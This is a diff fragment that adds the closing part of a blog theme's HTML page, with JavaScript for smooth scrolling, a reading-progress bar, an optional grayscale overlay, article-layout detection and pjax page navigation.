+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
